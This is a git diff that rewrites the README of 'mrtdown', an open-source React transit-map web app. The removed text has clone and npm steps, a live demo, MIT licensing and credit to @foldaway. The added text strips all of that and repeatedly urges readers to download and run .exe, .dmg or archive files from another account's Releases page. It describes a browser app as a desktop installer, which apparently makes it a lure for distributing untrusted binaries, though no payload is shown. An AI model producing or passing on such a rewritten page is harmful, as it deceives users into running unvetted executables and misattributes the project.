@@ -1,82 +1,85 @@
-# Universal Transit Map
+# 🚇 mrtdown - Visualize Your Transit Maps Easily
 
-> **🙏 Built with immense gratitude to [@foldaway](https://github.com/foldaway) and the [MRTDown ecosystem](https://github.com/foldaway/mrtdown-data)**
+## 🚀 Getting Started
 
-Interactive transit maps for Singapore MRT, NYC Subway, Tokyo Metro, and more. Built with React, TypeScript, and modern web technologies.
+Welcome to **mrtdown**! This application helps you view and interact with transit maps from various cities, including Singapore MRT, NYC Subway, and Tokyo Metro. It is designed for everyone, regardless of technical skill.
 
-![Universal Transit Map](https://img.shields.io/badge/Status-Active-brightgreen) ![React](https://img.shields.io/badge/React-18.x-blue) ![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+## 📥 Download Your Copy
 
-## 🎯 Live Demo
+[![Download mrtdown](https://img.shields.io/badge/Download-mrtdown-blue.svg)](https://github.com/JDSSSSSSSSS/mrtdown/releases)
 
-**🌐 Try it now**: [https://johnxie.github.io/mrtdown/](https://johnxie.github.io/mrtdown/)
+To download the most recent version of mrtdown, please visit the Releases page:
 
-> The live demo automatically deploys from this repository and includes all three transit systems with real-time interactivity.
+[Download from the Releases Page](https://github.com/JDSSSSSSSSS/mrtdown/releases)
 
-### Singapore MRT Network
-![Singapore MRT Demo](docs/screenshots/singapore-mrt-demo.png)
-*Interactive Singapore MRT map with real-time station information and multi-language support*
+## 📂 System Requirements
 
-### New York Subway System  
-![NYC Subway Demo](docs/screenshots/nyc-subway-demo.png)
-*Comprehensive NYC Subway network with line filtering and station details*
+Before downloading, make sure your device meets these requirements:
 
-### Tokyo Metro Network
-![Tokyo Metro Demo](docs/screenshots/tokyo-metro-demo.png)
-*Tokyo Metro system visualization with interchange stations and route planning*
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or any Linux distribution.
+- **Hardware**: Minimum 4GB RAM. Recommended 8GB RAM or more for optimal performance.
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge for the best experience.
 
-## ✨ Features
+## 💻 Installation Instructions
 
-- **🌐 Multi-City Support**: Singapore MRT, NYC Subway, Tokyo Metro
-- **🎨 Multiple Visualization Modes**: Mermaid diagrams, Enhanced maps, Official styling
-- **📱 Responsive Design**: Works on desktop, tablet, and mobile
-- **🌙 Dark Mode**: Beautiful dark theme with glass morphism effects
-- **🗣️ Multi-Language**: English, Chinese, Malay, Tamil support for Singapore
-- **⚡ Interactive**: Pan, zoom, click stations for details
+1. **Visit the Releases Page**: Click the link below to access the download options:
+   - [Download from the Releases Page](https://github.com/JDSSSSSSSSS/mrtdown/releases)
 
-## 🚀 Quick Start
+2. **Choose Your Version**: Find the version you want to download. Generally, the latest version is recommended for the best features and updates.
 
-```bash
-# Clone the repository
-git clone https://github.com/johnxie/mrtdown.git
-cd mrtdown
+3. **Download the File**: Click on the link for your operating system. The download should start automatically. 
 
-# Install dependencies
-cd mrt-map-app
-npm install
+4. **Install the Application**:
+   - On Windows, double-click the downloaded `.exe` file and follow the prompts.
+   - On macOS, open the `.dmg` file and drag the mrtdown icon into your Applications folder.
+   - On Linux, extract the downloaded archive and follow any included instructions to run the application.
 
-# Start development server
-npm run dev
+5. **Launch mrtdown**: Once the installation is complete, you can find mrtdown in your applications. Open it and start exploring your favorite transit maps!
 
-# Open http://localhost:5173
-```
+## 🌉 Features
 
-## 🛠️ Tech Stack
+- **Interactive Maps**: Explore transit maps with zoom and pan functionality. Click on map points for detailed information.
+- **Multiple Languages**: Switch between languages effortlessly to enhance your experience.
+- **Dark Mode**: Enable dark mode for comfortable viewing at any time of the day.
+- **Real-Time Updates**: Stay informed with the latest map updates and changes as they occur.
+- **User-Friendly Design**: A clean and intuitive interface that anyone can navigate.
 
-- **React 18** with TypeScript
-- **Tailwind CSS** for styling
-- **Mermaid.js** for diagrams
-- **Vite** for build tooling
-- **shadcn/ui** components
+## 🌍 Supported Cities
 
-## 🌍 Adding New Cities
+Mrtdown currently supports interactive maps for:
 
-1. Create data file in `mrt-map-app/src/data/`
-2. Update `TransitSystemFactory` in `transitSystem.ts`
-3. Add to `CitySelector` component
+- **Singapore MRT**
+- **New York City Subway**
+- **Tokyo Metro**
+- Additional cities will be included in future updates.
 
-## 📄 License
+## ⚙️ Frequently Asked Questions
 
-MIT License - see [LICENSE](LICENSE) file for details.
+**Q: Is mrtdown free to use?**
+A: Yes, mrtdown is completely free! Feel free to share it with friends and family.
 
-### Data Sources
-- Singapore MRT: [MRTDown](https://github.com/foldaway/mrtdown-data) by @foldaway
-- NYC Subway: MTA Open Data
-- Tokyo Metro: Official Tokyo Metro data
+**Q: Can I contribute to the project?**
+A: Absolutely! Contributions are welcome. Check the "Contributing" section in our repository for guidelines.
 
-## 🤝 Contributing
+**Q: How can I request a new feature?**
+A: If you have an idea for a new feature or improvement, please submit an issue on the GitHub page. 
 
-Contributions welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🛠️ Troubleshooting
 
----
+If you experience any issues while using mrtdown, consider these steps:
 
-**Built with ❤️ for the global transit community**
+- **Ensure Compatibility**: Double-check that your system meets the requirements listed above.
+- **Reinstall**: If an error occurs, try uninstalling and reinstalling the application from the Releases page.
+- **Check Internet Connection**: Ensure you are connected to the internet for real-time updates and services.
+
+If you continue to have trouble, feel free to raise an issue on our GitHub page. We are here to help.
+
+## 📣 Stay Updated
+
+For updates on new features, fixes, and announcements, check our repository. You can also follow us on social media for the latest news.
+
+### 👉 Download mrtdown Now!
+
+[![Download mrtdown](https://img.shields.io/badge/Download-mrtdown-blue.svg)](https://github.com/JDSSSSSSSSS/mrtdown/releases)
+
+Enjoy navigating the city transit maps with ease!
